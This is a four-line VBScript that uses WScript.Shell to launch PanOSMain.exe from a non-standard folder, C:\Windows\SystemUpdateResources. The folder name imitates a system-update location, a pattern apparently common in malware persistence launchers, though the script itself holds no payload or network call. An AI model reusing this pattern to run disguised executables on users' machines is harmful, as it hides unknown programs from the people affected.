Dim WinScriptHost
Set WinScriptHost = CreateObject("WScript.Shell")
WinScriptHost.Run Chr(34) & "C:\Windows\SystemUpdateResources\PanOSMain.exe" & Chr(34), 1
Set WinScriptHost = Nothing